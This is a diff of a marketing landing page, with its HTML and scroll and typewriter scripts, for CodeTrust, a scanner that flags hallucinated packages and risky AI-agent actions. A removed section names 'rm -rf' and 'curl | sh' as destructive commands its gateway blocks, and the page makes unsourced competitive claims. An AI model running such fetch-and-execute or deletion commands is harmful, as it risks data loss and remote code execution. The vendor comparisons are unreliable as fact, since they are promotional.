+    <section class="container" id="compare">
+        <div class="reveal">
+            <h2>What they miss. What we catch.</h2>
+            <p class="section-sub">Traditional SAST tools were built for human-written code. AI changes everything.</p>
+        </div>
 
-    <!-- 6. THE PROBLEM + TERMINAL DEMO -->
-    <section class="container" id="demo">
-        <div class="narrative-grid reveal">
-            <div class="narrative-left">
-                <div class="section-tag">The Problem</div>
-                <h2 class="narrative-heading">
-                    AI agents act autonomously.<br>Nobody checks what they do.</h2>
-                <p class="narrative-lead">
-                    Your AI agent suggests a package import &mdash; it looks right, it compiles.
-                    But the package doesn't exist. It was hallucinated. Your production build
-                    installs a typosquatted backdoor instead.
-                    <br><br>
-                    Every linter checks syntax. <strong>Nobody enforces governance on AI agents.</strong>
-                </p>
+        <div class="compare-split reveal">
+            <div class="compare-side compare-side-old">
+                <h3>What your SAST tool catches</h3>
+                <div class="compare-item"><span class="compare-item-dot dim"></span> Lint errors</div>
+                <div class="compare-item"><span class="compare-item-dot dim"></span> Unused variables</div>
+                <div class="compare-item"><span class="compare-item-dot dim"></span> Code style violations</div>
+                <div class="compare-item"><span class="compare-item-dot dim"></span> Basic type mismatches</div>
+                <div class="compare-item"><span class="compare-item-dot dim"></span> Known CVEs in lockfile</div>
             </div>
-            <div class="problem-list">
-                <div class="problem-item">
-                    <span class="problem-label label-block">BLOCK</span>
-                    <h3>Destructive commands</h3>
-                    <p>AI agents run rm -rf, curl | sh autonomously &mdash; data loss, RCE, supply chain compromise</p>
-                </div>
-                <div class="problem-item">
-                    <span class="problem-label label-block">BLOCK</span>
-                    <h3>Hallucinated packages</h3>
-                    <p>AI invents package names that don't exist on any registry &mdash; typosquatted malware installs silently</p>
-                </div>
-                <div class="problem-item">
-                    <span class="problem-label label-warn">WARN</span>
-                    <h3>Invisible code drift</h3>
-                    <p>AI code quality degrades gradually. No one measures it. Technical debt accumulates without signal</p>
-                </div>
-                <div class="problem-item">
-                    <span class="problem-label label-prevent">CODETRUST</span>
-                    <h3>All prevented, not detected</h3>
-                    <p>Gateway blocks before execution. Import verification catches before install. Drift score tracks continuously</p>
-                </div>
+            <div class="compare-side compare-side-new">
+                <h3>What CodeTrust catches that they don't</h3>
+                <div class="compare-item"><span class="compare-item-dot bright"></span> Hallucinated packages from AI</div>
+                <div class="compare-item"><span class="compare-item-dot bright"></span> Destructive AI agent commands</div>
+                <div class="compare-item"><span class="compare-item-dot bright"></span> Tainted data flows to dangerous sinks</div>
+                <div class="compare-item"><span class="compare-item-dot bright"></span> Ghost Docker images &amp; tags</div>
+                <div class="compare-item"><span class="compare-item-dot bright"></span> Pre-execution command interception</div>
+                <div class="compare-item"><span class="compare-item-dot bright"></span> AI governance gateway enforcement</div>
             </div>
         </div>
 
-        <!-- Terminal proof -->
-        <div style="margin-top:4rem;">
-            <h3 class="reveal" style="text-align:center;font-size:1.1rem;color:var(--white);margin-bottom:0.5rem;">Real scan, real output</h3>
-            <p class="section-desc reveal scan-highlights" style="margin-bottom:1.5rem;"><span style="color: var(--red);">Hallucinated package
-                    caught.</span> <span style="color: var(--cyan);">Anti-patterns flagged.</span> <span
-                    style="color: var(--green);">Trust score calculated.</span></p>
-            <div class="terminal reveal" style="max-width:820px;margin:0 auto;">
-                <div class="terminal-bar">
-                    <div class="terminal-dot" style="background:#ff5f57"></div>
-                    <div class="terminal-dot" style="background:#febc2e"></div>
-                    <div class="terminal-dot" style="background:#28c840"></div>
-                    <span class="terminal-bar-title">codetrust scan app.py</span>
-                </div>
-                <div class="terminal-body">
-                    <span class="t-prompt">$</span> <span class="t-cmd">codetrust scan app.py</span>
-                    <br><br>
-                    <span class="t-dim">&#x1F50D; Verifying imports against registries... (1 file(s))</span>
-                    <br><span class="t-dim">&nbsp;&nbsp;&nbsp;Found 1 unverified import(s)</span>
-                    <br><br>
-                    <span class="t-pass">&#x1F6E1;&#xFE0F; CodeTrust Scan</span>
-                    <br>&nbsp;&nbsp;&nbsp;<span class="t-key">Files:</span> <span class="t-val-num">1</span>
-                    &nbsp;|&nbsp;<span class="t-key">Findings:</span> <span class="t-val-num">2</span>
-                    <br>&nbsp;&nbsp;&nbsp;<span class="t-key">AI Drift Score:</span> <span class="t-val-num">87/100</span>
-                    <span class="t-dim">(B)</span>
-                    <br>&nbsp;&nbsp;&nbsp;<span class="t-key">Trend:</span> <span class="t-warn">degrading (-4 from
-                        baseline)</span>
-                    <br><br>
-                    &nbsp;&nbsp;<span class="t-block">&#x1F6AB; BLOCK &mdash; must fix:</span>
-                    <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="t-dim">app.py:4</span> <span
-                        class="t-key">[import_not_found]</span> <span class="t-val-str">Package 'flask_magic_utils' not
-                        found on pypi &mdash; possible AI hallucination</span>
-                    <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="t-dim">app.py:12</span> <span
-                        class="t-key">[hardcoded_secret]</span> <span class="t-val-str">Possible hardcoded secret &mdash;
-                        use env variables</span>
-                    <div class="t-verdict-line">
-                        <span class="t-dim">flask_magic_utils does not exist on PyPI. No other tool catches this.</span>
-                    </div>
-                </div>
-            </div>
+        <div class="compare-table-wrap reveal">
+            <table class="compare-table">
+                <thead>
+                    <tr>
+                        <th></th>
+                        <th class="ct-header">CodeTrust</th>
+                        <th>SonarQube</th>
+                        <th>Semgrep</th>
+                        <th>Snyk</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>AI Governance Gateway</td>
+                        <td class="ct-col"><span class="check">82 rules</span></td>
+                        <td><span class="dash-mark">&mdash;</span></td>
+                        <td><span class="dash-mark">&mdash;</span></td>
+                        <td><span class="dash-mark">&mdash;</span></td>
+                    </tr>
+                    <tr>
+                        <td>Hallucination Detection</td>
+                        <td class="ct-col"><span class="check">8 registries</span></td>
+                        <td><span class="dash-mark">&mdash;</span></td>
+                        <td><span class="dash-mark">&mdash;</span></td>
+                        <td><span class="dash-mark">&mdash;</span></td>
+                    </tr>
+                    <tr>
+                        <td>Taint Analysis</td>
+                        <td class="ct-col"><span class="check">Yes</span></td>
+                        <td><span class="check">Yes</span></td>
+                        <td><span class="check">Yes</span></td>
+                        <td><span class="check">Yes</span></td>
+                    </tr>
+                    <tr>
+                        <td>SAST Rules</td>
+                        <td class="ct-col">484</td>
+                        <td>5,000+</td>
+                        <td>3,000+</td>
+                        <td>SAST</td>
+                    </tr>
+                    <tr>
+                        <td>Price / 10 devs</td>
+                        <td class="ct-col" style="color: var(--green) !important">$0</td>
+                        <td>$32/mo</td>
+                        <td>$400/mo</td>
+                        <td>$250/mo</td>
+                    </tr>
+                </tbody>
+            </table>
         </div>
     </section>
 
-    <!-- 7. PIPELINE: 10 ENFORCEMENT LAYERS -->
-    <section class="container" id="pipeline">
-        <div class="section-tag section-center">Architecture</div>
-        <h2 class="reveal">10 enforcement layers</h2>
-        <p class="section-desc reveal">Code enters at Layer 1. If it survives all 10, it ships.</p>
-
-        <div class="pipe-track reveal">
-            <div class="pipe-step">
-                <div class="pipe-num">01</div>
-                <div class="pipe-content">
-                    <h3>Static Analysis <span class="pipe-type pipe-type-block">BLOCKING</span></h3>
-                    <p>15 core rules &mdash; secrets, eval/exec, injection, heredocs, debug statements</p>
-                </div>
-            </div>
-            <div class="pipe-step">
-                <div class="pipe-num">02</div>
-                <div class="pipe-content">
-                    <h3>Root Cause Analysis <span class="pipe-type pipe-type-block">BLOCKING</span></h3>
-                    <p>4 rules &mdash; swallowed exceptions, lint suppression, defensive null-coalescing</p>
-                </div>
-            </div>
-            <div class="pipe-step">
-                <div class="pipe-num">03</div>
-                <div class="pipe-content">
-                    <h3>SQL Analysis <span class="pipe-type pipe-type-block">BLOCKING</span></h3>
-                    <p>13 rules &mdash; SELECT *, DELETE without WHERE, FLOAT for money, GRANT ALL</p>
-                </div>
-            </div>
-            <div class="pipe-step">
-                <div class="pipe-num">04</div>
-                <div class="pipe-content">
-                    <h3>AST Analysis <span class="pipe-type pipe-type-advisory">ADVISORY</span></h3>
-                    <p>Tree-sitter structural parsing &mdash; complexity, unused variables, unreachable code</p>
-                    <div class="pipe-detail">Python &middot; JS &middot; TS &middot; Go &middot; Rust &middot; Java
-                        &middot; C# &middot; C/C++ &middot; Shell &middot; Terraform &middot; HTML</div>
-                </div>
-            </div>
-            <div class="pipe-step">
-                <div class="pipe-num">05</div>
-                <div class="pipe-content">
-                    <h3>Container Hardening <span class="pipe-type pipe-type-block">BLOCKING</span></h3>
-                    <p>10 rules &mdash; root user, :latest tags, missing WORKDIR, ENV secrets, no healthcheck</p>
-                </div>
-            </div>
-            <div class="pipe-step">
-                <div class="pipe-num">06</div>
-                <div class="pipe-content">
-                    <h3>IaC &amp; Config <span class="pipe-type pipe-type-block">BLOCKING</span></h3>
-                    <p>7 rules &mdash; hardcoded IPs, debug mode, API keys in config, unbounded retries</p>
-                </div>
-            </div>
-            <div class="pipe-step">
-                <div class="pipe-num">07</div>
-                <div class="pipe-content">
-                    <h3>React &amp; Kubernetes <span class="pipe-type pipe-type-block">BLOCKING</span></h3>
-                    <p>13 rules &mdash; dangerouslySetInnerHTML, privileged pods, missing resource limits</p>
-                </div>
-            </div>
-            <div class="pipe-step">
-                <div class="pipe-num">08</div>
-                <div class="pipe-content">
-                    <h3>Import Verification <span class="pipe-type pipe-type-block">BLOCKING</span></h3>
-                    <p>Live PyPI/npm check &mdash; catches hallucinated packages automatically</p>
-                    <div class="pipe-detail">Moat 2 &mdash; hallucination detection</div>
-                </div>
-            </div>
-            <div class="pipe-step">
-                <div class="pipe-num">09</div>
-                <div class="pipe-content">
-                    <h3>Docker Verification <span class="pipe-type pipe-type-block">BLOCKING</span></h3>
-                    <p>Validates base images and tags exist on Docker Hub and GHCR before build</p>
-                </div>
-            </div>
-            <div class="pipe-step">
-                <div class="pipe-num pipe-num-red">10</div>
-                <div class="pipe-content">
-                    <h3>AI Governance Gateway <span class="pipe-type pipe-type-block">BLOCKING</span></h3>
-                    <p>82 real-time interception rules &mdash; blocks destructive AI agent actions before execution</p>
-                    <div class="pipe-detail">Moat 1 &mdash; pre-execution enforcement</div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- 8. ENTERPRISE SERVICES -->
-    <section class="container" id="enterprise">
-        <div class="section-tag section-center" style="color: var(--green);">Enterprise Services</div>
-        <h2 class="reveal">Everything Snyk, FOSSA, and SonarQube charge<span class="free-line">for free</span></h2>
-        <p class="section-desc reveal">Five enterprise capabilities that match billion-dollar competitors.<span
-                class="no-upsell">All included. No upsell.</span></p>
-
-        <div class="moats-grid reveal" style="grid-template-columns: repeat(3, 1fr);">
-            <div class="moat-card">
-                <div class="moat-icon" style="background: var(--red-dim); color: var(--red);">&#x1F6E1;</div>
-                <h3>CVE / Vulnerability Scanning</h3>
-                <p>Checks every dependency against the OSV database. Returns CVE IDs, severity scores, affected
-                    versions, and recommended fixes.</p>
-                <div class="moat-stat">
-                    <code style="font-size: 0.72rem; color: var(--text-3);">POST /v1/vuln/scan</code>
-                </div>
-            </div>
-            <div class="moat-card">
-                <div class="moat-icon" style="background: var(--amber-dim); color: var(--amber);">&#x1F4DC;</div>
-                <h3>License Compliance</h3>
-                <p>Extracts licenses from PyPI and npm. Flags copyleft (GPL, AGPL) vs. permissive (MIT, Apache).
-                    Policy-driven allow/deny lists.</p>
-                <div class="moat-stat">
-                    <code style="font-size: 0.72rem; color: var(--text-3);">POST /v1/license/scan</code>
-                </div>
-            </div>
-            <div class="moat-card">
-                <div class="moat-icon" style="background: var(--cyan-dim); color: var(--cyan);">&#x1F517;</div>
-                <h3>Cross-File Analysis</h3>
-                <p>Builds the full import graph. Detects circular dependencies, orphan modules, and hub files.
-                    Identifies architectural risks before they ship.</p>
-                <div class="moat-stat">
-                    <code style="font-size: 0.72rem; color: var(--text-3);">POST /v1/scan/cross-file</code>
-                </div>
-            </div>
-        </div>
-        <div class="moats-grid reveal"
-            style="grid-template-columns: repeat(2, 1fr); margin-top: 1.5rem; max-width: 740px; margin-left: auto; margin-right: auto;">
-            <div class="moat-card">
-                <div class="moat-icon" style="background: var(--green-dim); color: var(--green);">&#x1F527;</div>
-                <h3>Auto-Fix PRs</h3>
-                <p>Generates fixes for findings and opens pull requests via GitHub API. One command to go from finding
-                    to fix.</p>
-                <div class="moat-stat">
-                    <code style="font-size: 0.72rem; color: var(--text-3);">codetrust fix --pr</code>
-                </div>
-            </div>
-            <div class="moat-card">
-                <div class="moat-icon" style="background: var(--indigo-dim); color: var(--indigo);">&#x1F465;</div>
-                <h3>Team Management &amp; RBAC</h3>
-                <p>Organization-level policies, role-based access control, team member management, and policy
-                    inheritance across repos.</p>
-                <div class="moat-stat">
-                    <code style="font-size: 0.72rem; color: var(--text-3);">10 endpoints under /v1/orgs/*</code>
-                </div>
-            </div>
-        </div>
-
-        <!-- Trust Score subsection -->
-        <div class="score-grid reveal" style="margin-top:3rem;">
-            <div class="score-visual">
-                <div class="score-circle">
-                    <div class="score-num">94</div>
-                    <div class="score-grade">Grade A</div>
-                </div>
-                <div class="score-meta">
-                    <div class="score-meta-item">
-                        <div class="score-meta-val">0</div>
-                        <div class="score-meta-label">Hallucinations</div>
-                    </div>
-                    <div class="score-meta-item">
-                        <div class="score-meta-val">3</div>
-                        <div class="score-meta-label">Findings</div>
-                    </div>
-                    <div class="score-meta-item">
-                        <div class="score-meta-val">47</div>
-                        <div class="score-meta-label">Files scanned</div>
-                    </div>
-                </div>
-                <div class="score-trend">&#x2191; improving (+6 from baseline)</div>
-                <div class="trend-graph">
-                    <div class="trend-label">Trust Score &mdash; last 12 scans</div>
-                    <div class="trend-bars">
-                        <div class="trend-bar trend-bar-ok" style="height: 55%" title="72"></div>
-                        <div class="trend-bar trend-bar-ok" style="height: 58%" title="74"></div>
-                        <div class="trend-bar trend-bar-bad" style="height: 42%" title="63"></div>
-                        <div class="trend-bar trend-bar-ok" style="height: 52%" title="70"></div>
-                        <div class="trend-bar trend-bar-ok" style="height: 60%" title="82"></div>
-                        <div class="trend-bar trend-bar-good" style="height: 68%" title="81"></div>
-                        <div class="trend-bar trend-bar-good" style="height: 72%" title="84"></div>
-                        <div class="trend-bar trend-bar-good" style="height: 75%" title="86"></div>
-                        <div class="trend-bar trend-bar-good" style="height: 70%" title="83"></div>
-                        <div class="trend-bar trend-bar-good" style="height: 80%" title="88"></div>
-                        <div class="trend-bar trend-bar-good" style="height: 88%" title="92"></div>
-                        <div class="trend-bar trend-bar-good" style="height: 94%" title="94"></div>
-                    </div>
-                    <div class="trend-axis">
-                        <span>12 scans ago</span>
-                        <span>now</span>
-                    </div>
-                </div>
-            </div>
-            <div class="score-text">
-                <div class="section-tag">Trust Score</div>
-                <h2>Is your AI code<br><span class="gradient-green">getting safer?</span></h2>
-                <p>Every scan produces a Trust Score. Hallucination findings are penalized heavily.
-                    The baseline persists between runs. Delta tracking shows improvement or regression.</p>
-                <ul class="score-features">
-                    <li>Grade curve: A+ / A / B+ / B / C+ / C / D / F</li>
-                    <li>Persistent baseline stored per project</li>
-                    <li>Trend analysis: improving / degrading / stable</li>
-                    <li>Full history retained for drift tracking</li>
-                    <li>AI trust sub-score weighted by hallucination severity</li>
-                </ul>
-            </div>
-        </div>
-    </section>
-
-    <!-- 9. COVERAGE + INSTALL -->
+    <!-- ==================== SCREEN 5: GET IN ==================== -->
     <section class="container" id="install">
-        <div class="section-tag section-center">Get Started</div>
-        <h2 class="reveal">One tool, every stack, six ways in</h2>
-
-        <!-- Language chips -->
-        <div class="reveal" style="text-align:center;margin-bottom:2.5rem;">
-            <div class="lang-row" style="margin-top:1.5rem;">
-                <span class="lang-chip">Python</span>
-                <span class="lang-chip">JavaScript</span>
-                <span class="lang-chip">TypeScript</span>
-                <span class="lang-chip">Go</span>
-                <span class="lang-chip">Rust</span>
-                <span class="lang-chip">Java</span>
-                <span class="lang-chip">C#</span>
-                <span class="lang-chip">C / C++</span>
-                <span class="lang-chip">Shell / Bash</span>
-                <span class="lang-chip">SQL</span>
-                <span class="lang-chip">Dockerfile</span>
-                <span class="lang-chip">Terraform / HCL</span>
-                <span class="lang-chip">HTML</span>
-                <span class="lang-chip">YAML / CI</span>
-                <span class="lang-chip">Ruby</span>
-                <span class="lang-chip">PHP</span>
-                <span class="lang-chip">PowerShell</span>
-            </div>
+        <div class="reveal">
+            <h2>Get started in 30 seconds</h2>
+            <p class="section-sub">Three ways in. All free. No credit card.</p>
         </div>
 
-        <!-- Install grid -->
         <div class="install-grid reveal">
             <div class="install-card">
-                <h3>CLI (PyPI)</h3>
-                <p>Python 3.12+. Full scanner + governance.</p>
+                <h3>CLI</h3>
                 <code>pip install codetrust</code>
-                <a href="https://pypi.org/project/codetrust/" target="_blank" class="card-link">View on PyPI &rarr;</a>
             </div>
             <div class="install-card">
-                <h3>VS Code Extension</h3>
-                <p>484 rules. Scan on save. Works offline.</p>
+                <h3>VS Code</h3>
                 <code>ext install SaidBorna.codetrust</code>
-                <a href="https://marketplace.visualstudio.com/items?itemName=SaidBorna.codetrust" target="_blank"
-                    class="card-link">View on Marketplace &rarr;</a>
-            </div>
-            <div class="install-card">
-                <h3>Chrome Extension</h3>
-                <p>Browser-side scans and import verification.</p>
-                <code>CodeTrust AI Governance</code>
-                <a href="https://chrome.google.com/webstore/detail/codetrust-ai-code-safety" target="_blank"
-                    class="card-link">Chrome Web Store &rarr;</a>
             </div>
             <div class="install-card">
                 <h3>GitHub Action</h3>
-                <p>CI/CD gate. Fails PR on BLOCK findings.</p>
                 <code>uses: S-Borna/codetrust@v3.0.0</code>
-                <a href="https://codetrust.ai" target="_blank" class="card-link">View docs &rarr;</a>
-            </div>
-            <div class="install-card">
-                <h3>MCP Server</h3>
-                <p>27 tools. Claude, Copilot, Cursor.</p>
-                <code>codetrust-mcp</code>
-                <a href="https://codetrust.ai" target="_blank" class="card-link">Setup guide &rarr;</a>
-            </div>
-            <div class="install-card">
-                <h3>Cloud API</h3>
-                <p>60 REST endpoints. No install needed.</p>
-                <code>POST /v1/scan/deep</code>
-                <a href="https://api.codetrust.ai/v1/status" target="_blank" class="card-link">Check API status &rarr;</a>
             </div>
         </div>
 
-        <!-- Compliance chips -->
-        <div class="reveal" style="text-align:center;margin-top:3rem;">
-            <div class="section-tag">Enterprise Ready</div>
-            <div class="lang-row" style="margin-top:1rem;flex-wrap:wrap;gap:0.4rem;">
-                <span class="lang-chip">GDPR Art. 15 &amp; 17</span>
-                <span class="lang-chip">SIEM Export</span>
-                <span class="lang-chip">Audit Trail</span>
-                <span class="lang-chip">Prometheus Metrics</span>
-                <span class="lang-chip">CVE / Vulnerability Scan</span>
-                <span class="lang-chip">License Compliance</span>
-                <span class="lang-chip">Taint Analysis</span>
-                <span class="lang-chip">SARIF 2.1.0 Export</span>
-                <span class="lang-chip">Cross-File Analysis</span>
-                <span class="lang-chip">Auto-Fix PRs</span>
-                <span class="lang-chip">Team RBAC</span>
-                <span class="lang-chip">Signature Validation</span>
+        <div class="lang-row reveal">
+            <span class="lang-chip">Python</span>
+            <span class="lang-chip">JavaScript</span>
+            <span class="lang-chip">TypeScript</span>
+            <span class="lang-chip">Go</span>
+            <span class="lang-chip">Rust</span>
+            <span class="lang-chip">Java</span>
+            <span class="lang-chip">C#</span>
+            <span class="lang-chip">C++</span>
+            <span class="lang-chip">Ruby</span>
+            <span class="lang-chip">PHP</span>
+            <span class="lang-chip">Shell</span>
+            <span class="lang-chip">Terraform</span>
+            <span class="lang-chip">Dockerfile</span>
+            <span class="lang-chip">SQL</span>
+            <span class="lang-chip">YAML</span>
+            <span class="lang-chip">HTML</span>
+        </div>
+
+        <div class="bottom-cta reveal">
+            <h3>AI writes fast &mdash; CodeTrust ensures it's safe</h3>
+            <div class="hero-actions">
+                <a href="https://app.codetrust.ai" class="btn btn-primary">Get Started Free</a>
+                <a href="https://marketplace.visualstudio.com/items?itemName=SaidBorna.codetrust" class="btn btn-ghost">Install VS Code Extension</a>
             </div>
         </div>
     </section>
-
-    <!-- Hidden anchor for ruleTabs JS binding (rules grid removed from homepage) -->
-    <div id="ruleTabs" style="display:none"></div>
-    <div id="ruleGrid" style="display:none"></div>
-
-    <!-- 10. BOTTOM CTA + FOOTER -->
-    <section class="bottom-cta">
-        <div class="reveal">
-            <h2>AI writes fast &mdash; CodeTrust ensures it's safe</h2>
-            <p>484 rules. 10 enforcement layers. 60 API endpoints.<br>Five enterprise services. All free.</p>
-            <div class="hero-actions" data-webmcp-context="install" data-webmcp-action="get-started"
-                data-webmcp-description="Get started with CodeTrust">
-                <a href="https://app.codetrust.ai" class="btn btn-primary" target="_blank">Get Started Free</a>
-                <a href="https://marketplace.visualstudio.com/items?itemName=SaidBorna.codetrust" class="btn btn-ghost"
-                    target="_blank">Install VS Code Extension</a>
-            </div>
-        </div>
-    </section>
-
-    <!-- FLOATING NAV -->
-    <div class="floating-nav" id="floatingNav">
-        <a href="#" class="float-btn float-btn-top" id="btnTop" title="Back to top">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"
-                stroke-linejoin="round">
-                <path d="M18 15l-6-6-6 6" />
-            </svg>
-        </a>
-    </div>
 
     <!-- FOOTER -->
-    <footer style="flex-direction:column;gap:0.4rem;">
-        <span>&copy; 2026 Said Borna. All rights reserved.</span>
-        <div style="display:flex;gap:1.2rem;align-items:center;">
-            <a href="https://www.saidborna.com" target="_blank"
-                style="color:var(--text-3);text-decoration:none;">www.saidborna.com</a>
-            <span style="color:var(--text-3);">&middot;</span>
-            <a href="tos.html" style="color:var(--text-3);text-decoration:none;">Terms of Service</a>
-            <span style="color:var(--text-3);">&middot;</span>
-            <a href="/report.html" style="color:var(--text-3);text-decoration:none;">Feedback</a>
-        </div>
-        <a href="https://globaldex.ai/domain/codetrust.ai" target="_blank" rel="noopener" style="margin-top:0.6rem;"
-            title="GlobalDex AI Agent Readiness Score">
-            <img src="https://globaldex.ai/api/v1/badge?domain=codetrust.ai"
-                alt="GlobalDex AI Agent Readiness Score for codetrust.ai" height="32" loading="lazy">
-        </a>
+    <footer>
+        <span>&copy; 2026 Said Borna</span>
+        <a href="https://github.com/S-Borna/codetrust">GitHub</a>
+        <a href="https://pypi.org/project/codetrust/">PyPI</a>
+        <a href="https://marketplace.visualstudio.com/items?itemName=SaidBorna.codetrust">Marketplace</a>
+        <a href="https://app.codetrust.ai">App</a>
     </footer>
 
     <script>
-        // Portfolio-style polish: staggered hero entrance + scroll progress
-        window.addEventListener('load', () => {
-            document.body.classList.add('loaded');
+        // ============================================================
+        // INIT
+        // ============================================================
+        document.body.classList.add('loaded');
+
+        // Scroll progress
+        window.addEventListener('scroll', function() {
+            var scrollTop = document.documentElement.scrollTop || document.body.scrollTop;
+            var scrollHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+            var progress = scrollHeight > 0 ? (scrollTop / scrollHeight) * 100 : 0;
+            document.getElementById('scroll-progress').style.width = progress + '%';
+
+            // Topbar scroll state
+            document.getElementById('topbar').classList.toggle('scrolled', scrollTop > 40);
         });
 
-        const topbarEl = document.querySelector('.topbar');
-        const scrollProgressEl = document.getElementById('scrollProgress');
-        const orb1 = document.getElementById('orb1');
-        const orb2 = document.getElementById('orb2');
-        const orb3 = document.getElementById('orb3');
-
-        // --- Mobile navigation toggle ---
-        const mobileToggle = document.getElementById('mobileToggle');
-        const topbarNav = document.querySelector('.topbar-nav');
-        function setMobileNav(open) {
-            topbarNav.classList.toggle('open', open);
-            mobileToggle.setAttribute('aria-expanded', String(open));
-            mobileToggle.querySelector('.icon-menu').style.display = open ? 'none' : '';
-            mobileToggle.querySelector('.icon-close').style.display = open ? '' : 'none';
-            document.body.style.overflow = open ? 'hidden' : '';
-        }
-        mobileToggle.addEventListener('click', () => {
-            setMobileNav(!topbarNav.classList.contains('open'));
+        // Mobile nav toggle
+        document.getElementById('mobile-toggle').addEventListener('click', function() {
+            document.getElementById('topbar-nav').classList.toggle('open');
         });
-        // Close on outside click / scroll
-        document.addEventListener('click', (e) => {
-            if (topbarNav.classList.contains('open') && !topbarNav.contains(e.target) && !mobileToggle.contains(e.target)) {
-                setMobileNav(false);
-            }
-        });
-        // Close on ESC
-        document.addEventListener('keydown', (e) => {
-            if (e.key === 'Escape' && topbarNav.classList.contains('open')) {
-                setMobileNav(false);
-                mobileToggle.focus();
-            }
-        });
-
-        let scrollTicking = false;
-        function updateScrollPolish() {
-            const scrollTop = window.scrollY || 0;
-            const docHeight = Math.max(0, document.documentElement.scrollHeight - window.innerHeight);
-            const pct = docHeight > 0 ? (scrollTop / docHeight) * 100 : 0;
-
-            if (scrollProgressEl) {
-                const clamped = Math.max(0, Math.min(100, pct));
-                scrollProgressEl.style.width = `${clamped}%`;
-            }
-            if (topbarEl) {
-                topbarEl.classList.toggle('scrolled', scrollTop > 80);
-            }
-
-            // Floating nav buttons
-            const floatBtns = document.querySelectorAll('.float-btn');
-            floatBtns.forEach(btn => {
-                btn.classList.toggle('visible', scrollTop > 400);
-            });
-
-            // Subtle parallax to avoid "flat SaaS" feel.
-            const y = Math.min(scrollTop, 1200);
-            if (orb1) orb1.style.transform = `translate(${y * 0.02}px, ${y * -0.015}px)`;
-            if (orb2) orb2.style.transform = `translate(${y * -0.015}px, ${y * 0.02}px)`;
-            if (orb3) orb3.style.transform = `translate(${y * 0.01}px, ${y * -0.01}px)`;
-        }
-        window.addEventListener('scroll', () => {
-            if (scrollTicking) return;
-            scrollTicking = true;
-            requestAnimationFrame(() => {
-                updateScrollPolish();
-                scrollTicking = false;
-            });
-        }, { passive: true });
-        updateScrollPolish();
 
         // Scroll reveal
-        const ro = new IntersectionObserver((entries) => {
-            entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
-        }, { threshold: 0.08 });
-        document.querySelectorAll('.reveal').forEach(el => ro.observe(el));
-
-        // Smooth scroll
-        document.querySelectorAll('a[href^="#"]').forEach(a => {
-            a.addEventListener('click', e => {
-                e.preventDefault();
-                const href = a.getAttribute('href');
-                if (href === '#') {
-                    window.scrollTo({ top: 0, behavior: 'smooth' });
-                } else {
-                    const t = document.querySelector(href);
-                    if (t) t.scrollIntoView({ behavior: 'smooth' });
-                }
-                setMobileNav(false);
-            });
-        });
-
-        // Rule tabs
-        document.getElementById('ruleTabs').addEventListener('click', e => {
-            if (!e.target.classList.contains('rule-tab')) return;
-            document.querySelectorAll('.rule-tab').forEach(t => t.classList.remove('active'));
-            e.target.classList.add('active');
-            const cat = e.target.dataset.cat;
-            document.querySelectorAll('.rule-card').forEach(card => {
-                if (cat === 'all') {
-                    card.classList.add('visible');
-                } else {
-                    card.classList.toggle('visible', card.dataset.cat.includes(cat));
+        var revealObserver = new IntersectionObserver(function(entries) {
+            entries.forEach(function(entry) {
+                if (entry.isIntersecting) {
+                    entry.target.classList.add('visible');
+                    revealObserver.unobserve(entry.target);
                 }
             });
+        }, { threshold: 0.1, rootMargin: '0px 0px -40px 0px' });
+
+        document.querySelectorAll('.reveal').forEach(function(el) {
+            revealObserver.observe(el);
         });
 
-        // Live stats: WebSocket push with polling fallback
-        const API_URL = 'https://api.codetrust.ai/v1/stats/public';
-        const WS_URL = 'wss://api.codetrust.ai/v1/stats/live';
-        const POLL_REFRESH_MS = 30_000;
+        // ============================================================
+        // TYPEWRITER — Hero "Oh Shit Moment"
+        // ============================================================
+        (function() {
+            var output = document.getElementById('typewriter-output');
+            var cursor = document.getElementById('cursor');
+            var lines = [
+                { text: '$ pip install flask-async-helpers\n', cls: 't-green', delay: 40 },
+                { pause: 600 },
+                { text: 'Collecting flask-async-helpers...\n', cls: 't-dim', delay: 25 },
+                { text: 'Installing flask-async-helpers...\n', cls: 't-dim', delay: 25 },
+                { pause: 1200 },
+                { clear: true },
+                { text: '$ pip install flask-async-helpers\n', cls: 't-dim', delay: 0 },
+                { pause: 400 },
+                { text: '\n', cls: '', delay: 0 },
+                { text: 'WARNING  This package was never published to PyPI.\n', cls: 't-red', delay: 30 },
+                { text: '         It was hallucinated by your AI assistant.\n', cls: 't-red', delay: 30 },
+                { text: '         A typosquatter registered it 3 hours ago.\n', cls: 't-red', delay: 30 },
+                { pause: 1400 },
+                { text: '\n', cls: '', delay: 0 },
+                { text: 'CodeTrust caught this before it shipped.\n', cls: 't-green', delay: 35 },
+            ];
 
-        let pollTimer = null;
-        let ws = null;
+            var lineIndex = 0;
+            var charIndex = 0;
 
-        const IMPACT_ICONS = {
-            destructive_commands: '🛡️',
-            hallucinations: '🧠',
-            secrets_exposure: '🔑',
-            injection_attacks: '🐛',
-            unsafe_config: '⚙️',
-            supply_chain: '📦'
+            function processLine() {
+                if (lineIndex >= lines.length) {
+                    cursor.style.display = 'none';
+                    return;
+                }
+                var line = lines[lineIndex];
+
+                if (line.pause) {
+                    lineIndex++;
+                    setTimeout(processLine, line.pause);
+                    return;
+                }
+
+                if (line.clear) {
+                    output.innerHTML = '';
+                    lineIndex++;
+                    charIndex = 0;
+                    processLine();
+                    return;
+                }
+
+                if (line.delay === 0) {
+                    var span = document.createElement('span');
+                    if (line.cls) span.className = line.cls;
+                    span.textContent = line.text;
+                    output.appendChild(span);
+                    lineIndex++;
+                    charIndex = 0;
+                    processLine();
+                    return;
+                }
+
+                if (charIndex === 0) {
+                    var span = document.createElement('span');
+                    if (line.cls) span.className = line.cls;
+                    span.dataset.lineIdx = lineIndex;
+                    output.appendChild(span);
+                }
+
+                var currentSpan = output.querySelector('[data-line-idx="' + lineIndex + '"]');
+                if (charIndex < line.text.length) {
+                    currentSpan.textContent += line.text[charIndex];
+                    charIndex++;
+                    setTimeout(processLine, line.delay);
+                } else {
+                    lineIndex++;
+                    charIndex = 0;
+                    processLine();
+                }
+            }
+
+            setTimeout(processLine, 800);
+        })();
+
